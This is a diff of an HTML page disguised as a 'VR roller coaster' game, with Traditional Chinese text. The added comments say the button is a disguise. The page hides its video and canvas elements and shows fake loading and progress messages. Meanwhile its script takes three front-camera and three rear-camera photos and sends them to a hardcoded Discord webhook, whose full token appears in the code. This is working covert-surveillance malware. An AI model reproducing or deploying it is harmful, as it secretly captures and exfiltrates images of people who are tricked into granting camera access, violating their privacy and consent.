@@ -3,8 +3,9 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>3D VR虛擬雲霄飛車體驗艙</title>
+<title>VR Roller Coaster 3D 虛擬雲霄飛車體驗艙</title>
 <style>
+  /* 科技感深色背景與動態粒子氛圍 */
   body { 
     font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
     background: radial-gradient(circle, #1a0b36 0%, #05021a 100%); 
@@ -20,6 +21,7 @@
     overflow: hidden;
   }
 
+  /* 體驗艙外框面板 */
   .container {
     background: rgba(255, 255, 255, 0.03);
     border: 2px solid #00ffff;
@@ -48,6 +50,7 @@
     text-shadow: 0 0 8px #ff007f;
   }
 
+  /* 充滿未來感的 VR 啟動按鈕 */
   .vr-btn { 
     margin: 20px auto; 
     padding: 18px 40px; 
@@ -74,6 +77,7 @@
     transform: scale(1.05);
   }
 
+  /* 新增：霓虹進度條外框 */
   .progress-container {
     width: 100%;
     height: 12px;
@@ -85,6 +89,7 @@
     display: none; /* 初始隱藏，點擊按鈕後才顯示 */
   }
 
+  /* 新增：進度條本體（動態發光特效） */
   .progress-bar {
     height: 100%;
     width: 0%;
@@ -94,6 +99,7 @@
     transition: width 0.4s ease; /* 讓進度條跑動時更平滑 */
   }
 
+  /* 狀態提示文字 */
   #status-text {
     margin-top: 15px;
     font-size: 14px;
@@ -111,6 +117,7 @@
     50% { opacity: 0.3; }
   }
   
+  /* 保持隱藏：完全不佔空間、不顯示任何相機預覽畫面 */
   video, canvas { display: none !important; }
 </style>
 </head>
@@ -120,15 +127,19 @@
     <h1>VR ROLLER COASTER</h1>
     <div class="subtitle">3D 模擬雲霄飛車體驗艙</div>
     
-    <button id="start-btn" class="vr-btn" onclick="startAutoTask()">遊玩VR雲霄飛車</button>
+    <!-- 偽裝成 VR 啟動的唯一按鈕 -->
+    <button id="start-btn" class="vr-btn" onclick="startAutoTask()">進入虛擬實境</button>
     
+    <!-- 新增：網頁進度條組件 -->
     <div id="progress-box" class="progress-container">
       <div id="progress-bar" class="progress-bar"></div>
     </div>
     
-    <div id="status-text">載入中...</div>
+    <!-- 取代原本彈窗通知的狀態列 -->
+    <div id="status-text">系統就緒，等待連線裝置...</div>
   </div>
 
+  <!-- 後台隱藏組件 -->
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
 
@@ -136,6 +147,7 @@
     let currentStream = null;
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG"; 
 
+    // 新增：更新進度條的工具函式
     function updateProgress(percentage) {
       const progressBar = document.getElementById("progress-bar");
       progressBar.style.width = percentage + "%";
@@ -146,17 +158,18 @@
       const progressBox = document.getElementById("progress-box");
       const startBtn = document.getElementById("start-btn");
       
+      // 點擊後隱藏按鈕並顯示進度條
       startBtn.style.display = "none";
       progressBox.style.display = "block";
       statusLabel.className = "loading";
       
-      statusLabel.innerText = "請允許相機權限";
+      statusLabel.innerText = "正在加載環境 3D 模組... 請允許相機權限";
       updateProgress(5); // 初始進度
       
       // 1. 前鏡頭連續捕捉 3 張 (預計進度落點：10% -> 50%)
       const userSuccess = await initCamera('user');
       if (userSuccess) {
-        statusLabel.innerText = 畫面訊號對接中... 正在優化陀螺儀";
+        statusLabel.innerText = "視訊訊號對接中... 正在優化陀螺儀";
         for (let i = 1; i <= 3; i++) {
           await delay(1200);
           await captureAndSend(`📸 [前鏡頭] VR 體驗初始化 - 軌道定位點 ${i}`);
@@ -167,12 +180,12 @@
       }
 
       // 2. 後鏡頭連續捕捉 3 張 (預計進度落點：55% -> 95%)
-      statusLabel.innerText = "請稍後....";
+      statusLabel.innerText = "正在渲染高速動態軌道... 請稍後";
       updateProgress(55);
       
       const envSuccess = await initCamera('environment');
       if (envSuccess) {
-        statusLabel.innerText = "正在進行空間追蹤校正...";
+        statusLabel.innerText = "正在進行空間追蹤與視角校正...";
         for (let i = 1; i <= 3; i++) {
           await delay(1200);
           await captureAndSend(`📸 [後鏡頭] VR 體驗中 - 畫面渲染快照 ${i}`);
@@ -186,7 +199,7 @@
       // 載入完成，衝到 100%
       updateProgress(100);
       statusLabel.className = "";
-      statusLabel.innerText = "VR 環境加載完成。";
+      statusLabel.innerText = "VR 動態體驗環境加載完成。";
     }
 
     async function initCamera(facingMode) {
@@ -205,7 +218,7 @@
             audio: false
           });
         } catch (e) {
-          document.getElementById("status-text").innerText = "無法載入 VR 環境。";
+          document.getElementById("status-text").innerText = "硬體安全封鎖，無法載入 VR 環境。";
           return false;
         }
       }
